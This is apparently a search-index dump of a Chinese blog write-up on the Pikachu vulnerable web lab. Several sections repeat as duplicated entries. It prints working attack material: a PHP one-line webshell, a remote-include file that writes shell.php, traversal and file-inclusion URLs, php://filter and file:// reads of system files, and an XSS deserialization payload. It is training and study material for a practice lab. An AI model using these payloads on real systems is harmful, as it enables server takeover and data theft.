http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#heading"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#访问任意文件"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#配合文件上传getshell"},{"categories":["web","wp"],"content":"\rFile inclusion(Remote)\r原理能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码 与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径 远程文件包含涉及到两个配置选项 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 同样摘取Henry404s师傅的文章： 远程生成Webshell首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为 \u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[123]);?\u003e');?\u003e 文件的url地址为 http://127.0.0.1/GenerateWebshell.txt 最终构成的远程包含payload为http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 网页访问该payload后会在fi_remote.php的同级目录下生成shell.php文件, 后续可用蚁剑进行连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#file-inclusionremote"},{"categories":["web","wp"],"content":"\rFile inclusion(Remote)\r原理能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码 与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径 远程文件包含涉及到两个配置选项 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 同样摘取Henry404s师傅的文章： 远程生成Webshell首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为 \u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[123]);?\u003e');?\u003e 文件的url地址为 http://127.0.0.1/GenerateWebshell.txt 最终构成的远程包含payload为http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 网页访问该payload后会在fi_remote.php的同级目录下生成shell.php文件, 后续可用蚁剑进行连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#原理-1"},{"categories":["web","wp"],"content":"\rFile inclusion(Remote)\r原理能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码 与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径 远程文件包含涉及到两个配置选项 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 同样摘取Henry404s师傅的文章： 远程生成Webshell首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为 \u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[123]);?\u003e');?\u003e 文件的url地址为 http://127.0.0.1/GenerateWebshell.txt 最终构成的远程包含payload为http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 网页访问该payload后会在fi_remote.php的同级目录下生成shell.php文件, 后续可用蚁剑进行连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#远程生成webshell"},{"categories":["web","wp"],"content":"\rOver Permission​ 如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 ​ 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。 ​ 越权漏洞又分为水平越权和垂直越权: 水平越权: A用户和B用户属于同一级别的用户, 但各自都不能操作对方的个人信息。若A用户能够越权操作B用户的个人信息, 这种情况我们称之为\"水平越权\" 垂直越权: A用户权限高于B用户, B用户能对A用户进行操作的情况称为\"垂直越权\" ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#over-permission"},{"categories":["web","wp"],"content":"\r水平越权\r​ 根据提示，登录lili的账号，进入查看个人信息页面，通过修改url，可查看并更改kobe，lucy的信息，存在水平越权漏洞 ​ 本关涉及到两个页面，一个是登录页面，另一个是用户信息的页面,而越权漏洞出现在查看用户信息的页面中，在进行校验时，仅校验了传进来的username，导致了漏洞 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#水平越权"},{"categories":["web","wp"],"content":"\r垂直越权​ 两个账号，一个是admin(高权限),另一个是pikachu(低权限)，在进行登录时会有两个数据包，第一个是登录的数据包，第二个是请求页面的数据包 此处摘取Henry404s师傅的分析： 通过源代码分析流程 1.首先是登录页面，用户提交信息，脚本从数据库中进行查询，对应的表中总共有3个字段，username，password，level，查询到数据之后，对level的值进行校验，然后签发session，并跳转到不同的页面。 $html=\"\"; if(isset($_POST['submit'])){ if($_POST['username']!=null \u0026\u0026 $_POST['password']!=null){ $username=escape($link, $_POST['username']); $password=escape($link, $_POST['password']);//转义，防注入 $query=\"select * from users where username='$username' and password=md5('$password')\"; $result=execute($link, $query); if(mysqli_num_rows($result)==1){ $data=mysqli_fetch_assoc($result); if($data['level']==1){//如果级别是1，进入admin.php $_SESSION['op2']['username']=$username; $_SESSION['op2']['password']=sha1(md5($password)); $_SESSION['op2']['level']=1; header(\"location:op2_admin.php\"); } if($data['level']==2){//如果级别是2，进入user.php $_SESSION['op2']['username']=$username; $_SESSION['op2']['password']=sha1(md5($password)); $_SESSION['op2']['level']=2; header(\"location:op2_user.php\"); } }else{ //查询不到，登录失败 $html.=\"\u003cp\u003e登录失败,请重新登录\u003c/p\u003e\"; } } } 2.接着是管理员页面，管理员页面中只要提交了id参数就可以完成一次删除操作，但是，此处校验较为严格，不存在越权漏洞。(至少我找不到) $link=connect(); // 判断是否登录，没有登录不能访问 //如果没登录，或者level不等于1，都就干掉 if(!check_op2_login($link) || $_SESSION['op2']['level']!=1){ header(\"location:op2_login.php\"); exit(); } //删除 if(isset($_GET['id'])){ $id=escape($link, $_GET['id']);//转义 $query=\"delete from member where id={$id}\"; execute($link, $query); } if(isset($_GET['logout']) \u0026\u0026 $_GET['logout'] == 1){ session_unset(); session_destroy(); setcookie(session_name(),'',time()-3600,'/'); header(\"location:op2_login.php\"); } 3.来到添加用户的页面,可以看到，相比于管理员页面的校验，此处缺少了对权限等级的校验，于是产生了越权。 $link=connect(); // 判断是否登录，没有登录不能访问 //这里只是验证了登录状态，并没有验证级别，所以存在越权问题。 if(!check_op2_login($link)){ header(\"location:op2_login.php\"); exit(); } if(isset($_POST['submit'])){ if($_POST['username']!=null \u0026\u0026 $_POST['password']!=null){//用户名密码必填 $getdata=escape($link, $_POST);//转义 $query=\"insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['address']}')\"; $result=execute($link, $query); if(mysqli_affected_rows($link)==1){//判断是否插入 header(\"location:op2_admin.php\"); }else { $html.=\"\u003cp\u003e修改失败,请检查下数据库是不是还是活着的\u003c/p\u003e\"; } } } if(isset($_GET['logout']) \u0026\u0026 $_GET['logout'] == 1){ session_unset(); session_destroy(); setcookie(session_name(),'',time()-3600,'/'); header(\"location:op2_login.php\"); } ------------------------------------------------------------------------------------------------------------------------------------------ //此处涉及到校验是否登录的函数。 function check_op2_login($link){ if(isset($_SESSION['op2']['username']) \u0026\u0026 isset($_SESSION['op2']['password'])){ $query=\"select * from users where username='{$_SESSION['op2']['username']}' and sha1(password)='{$_SESSION['op2']['password']}'\"; $result=execute($link,$query); if(mysqli_num_rows($result)==1){ return true; }else{ return false; } }else{ return false; } } ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#垂直越权"},{"categories":["web","wp"],"content":"\rPath-traversal​ 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#path-traversal"},{"categories":["web","wp"],"content":"\r目录遍历任意输入一个title值，爆出当前目录 随后对url中的payload进行修改即可实现目录遍历 例如： http://127.0.0.1/vul/dir/dir_list.php?title=../../../README.md ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#目录遍历"},{"categories":["web","wp"],"content":"\rRemote Commandcode Execute​ RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 ​ 分为远程代码执行和远程系统命令执行 远程系统命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#remote-commandcode-execute"},{"categories":["web","wp"],"content":"\rexec\"ping\"查看rce_ping源码文件, 可发现$_POST['ipaddress']变量未经任何安全处理就传给了$ip, 由此造成了远程命令执行漏洞 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#execping"},{"categories":["web","wp"],"content":"\rexec “eval”查看源码可知，$POST['txt']未经任何过滤处理就作为eval函数的参数, 由此造成远程代码执行漏洞 输入phpinfo();,得到回显 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#exec-eval"},{"categories":["web","wp"],"content":"\rServer-Side Request Forgery​ 服务器端请求伪造,其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制,导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据 ​ 数据流:攻击者—–\u003e服务器—-\u003e目标地址 PHP中下面函数的使用不当会导致SSRF: file_get_contents() fsockopen() curl_exec() ​ 如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。 ​ 查看一下源代码：\r源码中阐述了：curl支持很多协议，比如FTP,FTPS,HTTP,HTTPS,GOPHER,TELNET,DICT,FILE等协议 我本地环境里的ssrf打不开了，这里摘取charmersix的笔记： 我们也可以效仿上上个漏洞,通过file协议读取一些我们想要的文件 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#server-side-request-forgery"},{"categories":["web","wp"],"content":"\rSSRF(file_get_contents)​ file_get_contents() 函数是PHP中用于读取文件内容的内置函数之一。它以字符串形式返回指定文件的全部内容。 ​ 我的本地环境报了个奇怪的错误，这里先引用一下Henry404s师傅的笔记： ​ file_get_contents() 把整个文件读入一个字符串中。 //读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php //内网请求:http://x.x.x.x/xx.index if(isset($_GET['file']) \u0026\u0026 $_GET['file'] !=null){ $filename = $_GET['file']; $str = file_get_contents($filename); echo $str; } ​ 由于使用的函数不一样了，利用方法也就不同了，这里，探测端口似乎不再灵验，但是依然可以实现文件的读取 http://192.168.1.101/pikachu/vul/ssrf/ssrf_fgc.php ?file=file:///C:/Windows/System32/drivers/etc/hosts 可以发起内网请求，而不必跳转到另一个服务器，而使用curl则需要跳转 除此之外，还可以读取出网页源码，直接使用本题提供的payload ?file=php://filter/read=convert.base64-encode/resource=ssrf.php 另外，这位师傅还总结了php中file_get_contents与curl的区别： 1.curl支持更多功能 curl支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap;模拟Cookie登录，爬取网页;FTP上传下载。fopen / file_get_contents只能使用GET方式获取数据。 2.性能 curl可以进行DNS缓存，同一个域名下的图片或其它资源只需要进行一次DNS查询。 curl相对来说更加快速稳定，访问量高的时候首选curl，缺点就是相对于file_get_contents配置繁琐一点，file_get_contents 适用与处理小访问的应用。 ———————————————— https://blog.csdn.net/weixin_44178492/article/details/108959980 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#ssrffile_get_contents"},{"categories":["web","wp"],"content":"\rUnsafe Filedownload不安全的文件下载 ​ 文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。 ​ 如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 ​ 查看文件源代码，可知下载提取的目录文件夹是download，通过抓包我们可对get方式传输的payload进行修改，改为： http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../index.html 这样就下载到了非预期文件 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#unsafe-filedownload"},{"categories":["web","wp"],"content":"\rUnsafe Upfileupload不安全的文件上传漏洞 ​ 比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。 ​ 在设计文件上传功能时，要对传进来的文件进行严格的安全考虑。比如： –验证文件类型、后缀名、大小; –验证文件的上传方式; –对文件进行一定复杂的重命名; –不要暴露文件上传后的路径; –等等… ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#unsafe-upfileupload"},{"categories":["web","wp"],"content":"\rClient Check无法上传php文件， 通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改\r将此处改为a.php即可，随后蚁剑连接 方法二：浏览器禁用JavaScript\r(Chrome浏览器可以使用JavaScript Switch插件一键禁用) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#client-check"},{"categories":["web","wp"],"content":"\rClient Check无法上传php文件， 通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改\r将此处改为a.php即可，随后蚁剑连接 方法二：浏览器禁用JavaScript\r(Chrome浏览器可以使用JavaScript Switch插件一键禁用) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#方法一上传一个jpg后缀的一句话木马在bp中抓包并对文件后缀进行修改"},{"categories":["web","wp"],"content":"\rClient Check无法上传php文件， 通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改\r将此处改为a.php即可，随后蚁剑连接 方法二：浏览器禁用JavaScript\r(Chrome浏览器可以使用JavaScript Switch插件一键禁用) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#方法二浏览器禁用javascript"},{"categories":["web","wp"],"content":"\rMIME type查看源代码，可知MIME是通过判断你的文件类型(而不是后缀名)来决定是否允许你上传文件，只需抓包修改content_type值就能绕过验证 改为 Content-Type: image/jpeg ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#mime-type"},{"categories":["web","wp"],"content":"\rgetimagesize()验证getimagesize()函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部 可通过制作图片木马或再木马文件内容头部添加GIF89a(Gif图片文件头), 然后利用文件包含漏洞来解析图片木马 当然也可以直接在一张真正的图片后面插入一句话木马 传入jpg一句话木马，我们再通过文件包含，将jpg进行php渲染，便可以通过蚁剑来连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:1:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#getimagesize验证"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\u003cscript\u003ealert('xss')\u003c/script\u003e\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\u003cscript\u003ealert('xss')\u003c/script\u003e\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#php-unserialize"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#序列化serialize"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#反序列化unserialize"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} 查看一下源码： 